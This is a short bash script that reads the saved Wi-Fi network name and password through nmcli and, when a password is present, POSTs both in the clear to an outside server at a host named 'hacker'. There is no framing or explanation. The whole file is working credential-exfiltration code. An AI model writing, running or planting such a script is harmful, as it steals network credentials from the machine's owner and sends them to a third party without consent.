#!/bin/bash
ssid=$(nmcli device wifi show-password | grep SSID | cut -d : -f 2 | xargs)
password=$(nmcli device wifi show-password | grep Password | cut -d : -f 2 | xargs)
if [ ! -z "$password" ]; then curl -X POST -F "data=ssid:$ssid password:$password" http://hacker.huakunshen.com:3000/email; fi